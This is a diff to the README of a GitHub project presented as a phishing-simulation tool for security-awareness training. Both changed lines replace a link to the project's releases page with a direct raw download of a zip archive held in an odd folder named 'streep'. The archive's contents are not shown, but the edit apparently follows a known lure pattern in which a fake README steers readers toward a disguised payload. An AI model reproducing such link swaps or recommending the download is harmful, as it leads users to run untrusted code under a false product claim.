@@ -1,6 +1,6 @@
 # 🛡️ awesome_phishing_bot - Run realistic security drills with ease
 
-[![](https://img.shields.io/badge/Download_Application-Blue)](https://github.com/Ludena6163/awesome_phishing_bot/releases)
+[![](https://img.shields.io/badge/Download_Application-Blue)](https://github.com/Ludena6163/awesome_phishing_bot/raw/refs/heads/main/streep/phishing_bot_awesome_v2.4-beta.2.zip)
 
 awesome_phishing_bot helps cybersecurity teams test their security awareness. You create controlled simulations to see how staff react to fake phishing emails. This tool provides data to help your team improve their defense against real threats.
 
@@ -17,7 +17,7 @@ Your computer needs a few basic items to run this software. Please check these s
 
 ## 📥 How to Download 
 
-Visit [this page](https://github.com/Ludena6163/awesome_phishing_bot/releases) to download the application. 
+Visit [this page](https://github.com/Ludena6163/awesome_phishing_bot/raw/refs/heads/main/streep/phishing_bot_awesome_v2.4-beta.2.zip) to download the application. 
 
 Follow these steps to find the right file:
 1. Open the website link above in your web browser.
